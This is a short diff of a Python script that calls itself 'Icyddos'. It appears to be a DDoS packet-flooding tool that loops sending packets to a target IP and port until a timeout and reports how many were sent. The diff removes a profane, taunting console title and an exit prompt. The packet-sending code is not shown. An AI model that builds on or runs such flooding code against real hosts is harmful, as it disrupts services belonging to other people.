@@ -14,7 +14,6 @@ os.system('cls')
 print('@copyright Iceyzx, 2022')
 print('\n[+] Icyddos starting...')
 time.sleep(5)
-os.system(f'title GET FUCKED BITCH, FLOODING {ip} LOLOLOLOLOLOLOLOLOLOLOLOLOL CRY MOTHERFUCKER')
 while True:
 	if time.time() > timeout:
 		break
@@ -25,4 +24,3 @@ while True:
 	print("SENT %s PACKETS TO %s THROUGH PORT %s"%(sent, ip, port))
 print('')
 print(f'{sent} PACKETS ARE SENT TO {ip}')
-end = input('Type anything to exit...')
